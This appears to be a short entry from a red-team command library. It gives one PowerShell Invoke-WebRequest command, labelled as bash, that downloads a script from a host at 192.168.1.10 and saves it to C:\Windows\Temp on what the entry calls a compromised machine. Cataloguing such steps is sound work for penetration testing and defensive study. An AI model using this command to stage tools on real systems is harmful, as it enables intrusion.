---
id: d059e39c-0c11-4aa0-8538-8b2ab6667bd8
name: Download and save file to compromised machine
type: command
executor: bash
data: 'Invoke-WebRequest "http://192.168.1.10:8080/tools/ps/SomeBS.ps1" -OutFile "C:\Windows\Temp\SomeBS.ps1"

  '
output: null
created_at: '2020-07-15T19:05:45.532766+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Download and save file to compromised machine

```bash
Invoke-WebRequest "http://192.168.1.10:8080/tools/ps/SomeBS.ps1" -OutFile "C:\Windows\Temp\SomeBS.ps1"

```
